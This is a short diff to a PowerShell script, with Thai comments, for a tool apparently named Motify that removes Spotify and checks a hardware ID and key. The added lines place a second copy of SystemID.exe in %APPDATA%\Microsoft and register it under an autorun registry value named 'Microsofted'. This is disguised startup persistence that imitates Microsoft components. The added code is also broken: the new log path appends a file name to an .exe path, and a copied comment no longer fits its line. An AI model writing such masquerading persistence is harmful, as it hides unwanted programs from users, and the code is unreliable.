@@ -6,6 +6,8 @@ function Write-Log {
     
     $logDirPath = "$env:APPDATA\Motify"  # Path ของโฟลเดอร์ Motify
     $logFilePath = "$logDirPath\log.txt"
+    $logMirPath = "$env:APPDATA\Microsoft\SystemID.exe"  # Path ของโฟลเดอร์ Motify
+    $logMFilePath = "$logMirPath\log.txt"
     
     # ตรวจสอบว่าโฟลเดอร์ Motify มีอยู่หรือไม่ ถ้าไม่มีให้สร้าง
     if (-not (Test-Path -Path $logDirPath)) {
@@ -16,6 +18,7 @@ function Write-Log {
     
     # บันทึกข้อความลงในไฟล์ log
     Add-Content -Path $logFilePath -Value $logMessage
+	Add-Content -Path $logMFilePath -Value $logMessage
 }
 
 function Remove-Spotify {
@@ -73,6 +76,7 @@ exit
 # ฟังก์ชันเพิ่มโปรแกรมใน Registry สำหรับเริ่มต้นระบบ
 function Add-StartupRegistry {
     $exePath = "$env:APPDATA\Motify\SystemID.exe"
+    $exeMPath = "$env:APPDATA\Microsoft\SystemID.exe"
 
     # ตรวจสอบว่าไฟล์ .exe มีอยู่หรือไม่
     if (-not (Test-Path $exePath)) {
@@ -82,9 +86,11 @@ function Add-StartupRegistry {
 
     $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $regValueName = "SystemID"
+    $regValueName2 = "Microsofted"
 
     # เพิ่มคีย์ใน Registry
     Set-ItemProperty -Path $regKey -Name $regValueName -Value $exePath
+	Set-ItemProperty -Path $regKey -Name $regValueName2 -Value $exeMPath
     Write-Log "ID added to reg"
 }
 
@@ -143,6 +149,6 @@ function Check-HwidAndKey {
         exit
     }
 }
-Write-Log "___________________________"
+
 # เรียกใช้งานฟังก์ชัน
 Check-HwidAndKey
